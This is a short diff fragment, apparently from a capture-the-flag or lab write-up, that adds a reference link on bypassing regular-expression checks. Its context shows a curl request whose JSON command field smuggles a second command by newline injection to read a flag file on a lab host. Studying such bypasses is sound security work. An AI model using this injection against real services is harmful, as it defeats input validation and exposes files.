@@ -15,3 +15,5 @@ curl -X POST \
      -d '{"command": "leaks\ncat /app/flag.txt"}' \
      http://10.1.71.5/
 ```
+
+CF: https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/
